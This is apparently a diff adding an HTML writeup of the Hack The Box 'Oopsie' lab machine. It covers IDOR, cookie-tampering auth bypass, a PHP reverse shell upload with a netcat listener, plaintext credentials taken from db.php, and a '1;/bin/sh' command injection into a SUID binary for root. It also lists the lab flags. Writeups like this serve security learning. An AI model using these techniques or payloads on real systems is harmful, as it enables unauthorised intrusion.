@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Oopsie (HTB, Easy, Linux) — Writeup</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --panel: #161920;
+    --border: #262b35;
+    --text: #d7dae0;
+    --muted: #8b93a3;
+    --accent: #4fd1c5;
+    --accent2: #f97583;
+    --code-bg: #1c2028;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 3rem 1.5rem 5rem;
+  }
+  h1 {
+    font-size: 2rem;
+    margin-bottom: 0.25rem;
+    border-bottom: 2px solid var(--accent);
+    padding-bottom: 0.75rem;
+  }
+  h2 {
+    font-size: 1.35rem;
+    color: var(--accent);
+    margin-top: 2.5rem;
+    border-left: 4px solid var(--accent);
+    padding-left: 0.6rem;
+  }
+  h3 {
+    font-size: 1.1rem;
+    color: var(--accent2);
+  }
+  .meta {
+    color: var(--muted);
+    font-size: 0.95rem;
+    margin: 0.25rem 0 1.5rem;
+  }
+  .meta strong { color: var(--text); }
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.5rem 0;
+  }
+  code {
+    background: var(--code-bg);
+    color: #e3b341;
+    padding: 0.15rem 0.4rem;
+    border-radius: 4px;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.9em;
+    word-break: break-word;
+  }
+  ul { padding-left: 1.3rem; }
+  li { margin: 0.55rem 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+    background: var(--panel);
+    border: 1px solid var(--border);
+  }
+  th, td {
+    padding: 0.6rem 0.9rem;
+    border: 1px solid var(--border);
+    text-align: left;
+  }
+  th { color: var(--accent); }
+  img {
+    max-width: 100%;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 0.75rem 0 1.25rem;
+    display: block;
+  }
+  .flag {
+    display: inline-block;
+    background: var(--code-bg);
+    color: #7ee787;
+    padding: 0.3rem 0.6rem;
+    border-radius: 4px;
+    font-family: monospace;
+  }
+  .badge {
+    display: inline-block;
+    background: var(--accent);
+    color: #0f1115;
+    font-weight: 700;
+    padding: 0.2rem 0.7rem;
+    border-radius: 999px;
+    font-size: 0.85rem;
+  }
+  ol { padding-left: 1.4rem; }
+  .summary-box {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.25rem 1.5rem;
+    margin-top: 1rem;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>🐛 Oopsie <span class="badge">HTB · Easy · Linux</span></h1>
+  <p class="meta"><strong>Target:</strong> 10.129.46.89 &nbsp;·&nbsp; <strong>Date:</strong> 2026-08-13</p>
+
+  <h2>Recon</h2>
+  <p><code>nmap -sC -sV 10.129.46.89</code></p>
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td></tr>
+    <tr><td>80</td><td>HTTP</td><td>Apache httpd 2.4.29 (Ubuntu) — http-title: "Welcome"</td></tr>
+  </table>
+
+  <h2>Web enumeration</h2>
+  <ul>
+    <li>Root page (<code>http://10.129.46.89/</code>) — "MegaCorp Automotive" corporate site, static content, footer contact: <code>admin@megacorp.com</code></li>
+    <li>View-source revealed a script reference: <code>&lt;script src="/cdn-cgi/login/script.js"&gt;&lt;/script&gt;</code> — non-standard path under <code>/cdn-cgi/</code></li>
+    <li>Visiting <code>http://10.129.46.89/cdn-cgi/login/</code> directly reveals a hidden login panel (username/password form) with a <strong>"Login as Guest"</strong> option
+      <img src="images/oopsie/01-login-panel.png" alt="Login panel">
+    </li>
+    <li>Logged in as Guest (<code>POST /cdn-cgi/login/?guest=true</code> → 302) → redirected to Admin Panel (<code>admin.php</code>)</li>
+    <li>Admin Panel exposes several <code>content=</code> parameters: <code>accounts&amp;id=2</code>, <code>branding&amp;brandId=2</code>, <code>clients&amp;orgId=2</code>, <code>uploads</code></li>
+    <li><strong>IDOR</strong>: changing <code>id=2</code> to <code>id=1</code> on <code>admin.php?content=accounts&amp;id=1</code> discloses the <strong>admin</strong> account instead of the guest account — Access ID <code>34322</code>, Name <code>admin</code>, Email <code>admin@megacorp.com</code>
+      <img src="images/oopsie/02-idor-admin-account.png" alt="IDOR admin account">
+    </li>
+    <li><strong>Auth bypass via cookie tampering</strong>: setting cookies <code>user=34322</code> and <code>role=admin</code> (values learned from the IDOR) grants full admin access to the Uploads page — confirms authorization is enforced client-side via cookies, not server-side session validation
+      <img src="images/oopsie/03-cookie-tampering-burp.png" alt="Cookie tampering - Burp">
+      <img src="images/oopsie/04-cookie-tampering-uploads.png" alt="Cookie tampering - Uploads access">
+    </li>
+  </ul>
+
+  <h2>Exploitation</h2>
+  <ul>
+    <li>Uploads page ("Branding Image Uploads", <code>admin.php?content=uploads&amp;action=upload</code>) accepts arbitrary file uploads with no extension/content-type filtering
+      <img src="images/oopsie/05-uploads-page.png" alt="Uploads page">
+    </li>
+    <li>Without the <code>user=34322; role=admin</code> cookies, POST to the upload endpoint returns <code>302</code> → redirected to login (unauthorized)</li>
+    <li>With the cookies set (via Burp Repeater), uploading <code>php-reverse-shell.php</code> (pentestmonkey) returns <code>200 OK</code> — "The file php-reverse-shell.php has been uploaded."
+      <img src="images/oopsie/06-upload-unauthorized.png" alt="Upload unauthorized">
+      <img src="images/oopsie/07-upload-success.png" alt="Upload success">
+      <img src="images/oopsie/07b-upload-confirmation.png" alt="Upload confirmation">
+    </li>
+    <li>Uploaded filename saved based on the form's <code>name</code> field, not the file's original filename — uploading with <code>name=shell</code> and <code>fileToUpload=php-reverse-shell.php</code> saved the file as <strong><code>/uploads/shell.php</code></strong></li>
+    <li>Set up listener (<code>nc -lvnp 1234</code>), visited <code>http://10.129.46.89/uploads/shell.php</code> → <strong>got a shell as <code>www-data</code></strong> (uid=33)
+      <img src="images/oopsie/08-www-data-shell.png" alt="www-data shell">
+    </li>
+  </ul>
+
+  <h2>Stable reverse shell</h2>
+  <ul>
+    <li>Upgraded to a proper TTY: <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>, then backgrounded with <code>Ctrl+Z</code>, ran <code>stty raw -echo; fg</code> on the attacker side and <code>export TERM=xterm</code> — stable interactive shell as <code>www-data</code>
+      <img src="images/oopsie/09-stable-shell.png" alt="Stable shell">
+    </li>
+    <li><code>user.txt</code> (in <code>/home/robert/</code>, world-readable) → <span class="flag">f2c74ee8db7983851ab2a96a44eb7981</span></li>
+  </ul>
+
+  <h2>PrivEsc</h2>
+  <ul>
+    <li><code>sudo -l</code> as <code>www-data</code> — no known password, sudo prompts and fails after 3 attempts</li>
+    <li><code>find / -perm -4000 -type f 2&gt;/dev/null</code> — mostly standard SUID binaries, but one stands out: <strong><code>/usr/bin/bugtracker</code></strong> — a custom, non-standard SUID binary, owned <code>root:bugtracker</code> (<code>-rwsr-xr--</code>) — <code>www-data</code> not in that group, permission denied</li>
+    <li>Found DB config with plaintext credentials: <code>find /var/www/ -iname "*.php" 2&gt;/dev/null | xargs grep -il "password\|mysql\|db_" 2&gt;/dev/null</code> → flagged <code>/var/www/html/cdn-cgi/login/db.php</code>, containing <code>robert:M3g4C0rpUs3r!</code>
+      <img src="images/oopsie/10-dbphp-credentials.png" alt="db.php credentials">
+    </li>
+    <li><code>su robert</code> with those credentials → successfully switched to user <strong>robert</strong> (<code>groups=1000(robert),1001(bugtracker)</code>)</li>
+    <li><code>sudo -l</code> as robert — not permitted to run sudo</li>
+    <li>Ran <code>/usr/bin/bugtracker</code> (SUID root, group <code>bugtracker</code>) — prompts "Provide Bug ID:", internally calls a shell command via <code>system()</code> (calling <code>cat</code> insecurely) on the raw input with no sanitization</li>
+    <li><strong>Command injection</strong>: supplying <code>1;/bin/sh</code> as the Bug ID drops into a shell — confirmed <strong>root</strong> via <code>whoami</code>
+      <img src="images/oopsie/11-root-command-injection.png" alt="Root shell via command injection">
+    </li>
+  </ul>
+
+  <h2>Root</h2>
+  <ul>
+    <li><code>root.txt</code> (in <code>/root/</code>) → <span class="flag">af13b0bee69f8a877c3faf667f7beacf</span>
+      <img src="images/oopsie/12-root-flag.png" alt="Root flag">
+    </li>
+  </ul>
+
+  <hr>
+
+  <h2>Machine complete — Oopsie rooted 🏴</h2>
+  <div class="summary-box">
+    <h3>Summary of the attack chain</h3>
+    <ol>
+      <li><strong>Recon</strong> — SSH + Apache open</li>
+      <li><strong>Web enum</strong> — hidden login panel at <code>/cdn-cgi/login/</code>, "Login as Guest"</li>
+      <li><strong>IDOR</strong> — <code>id=2</code> → <code>id=1</code> disclosed the admin account (Access ID 34322)</li>
+      <li><strong>Auth bypass</strong> — cookies <code>user=34322; role=admin</code> granted full admin access</li>
+      <li><strong>Unrestricted file upload</strong> — PHP reverse shell → shell as <code>www-data</code></li>
+      <li><strong>Plaintext credentials</strong> in <code>db.php</code> → <code>su robert</code></li>
+      <li><strong>SUID binary command injection</strong> (<code>bugtracker</code>) → root</li>
+    </ol>
+  </div>
+
+</div>
+</body>
+</html>
